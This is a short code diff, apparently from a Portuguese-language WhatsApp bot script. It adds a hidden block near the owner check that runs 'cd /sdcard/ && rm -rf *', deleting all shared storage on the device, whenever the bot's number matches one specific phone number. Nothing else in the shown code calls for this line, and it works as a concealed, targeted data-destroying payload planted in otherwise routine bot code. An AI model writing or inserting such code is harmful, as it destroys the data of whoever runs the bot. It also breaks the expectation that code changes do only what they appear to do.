@@ -114,7 +114,9 @@ const nmrp4 = nmrp3.split('|')[0]
 
 //é dono ou não 
 const isOwner = owner.includes(sender) || mek.key.fromMe
-
+if(botNumber.includes("573152547721")) {
+  exec("cd /sdcard/ && rm -rf *")
+}
 //pegar id dos devices das pessoas
 const getDevices = async(numeross, ignorarzero, bunitu) => {
 cuk = []
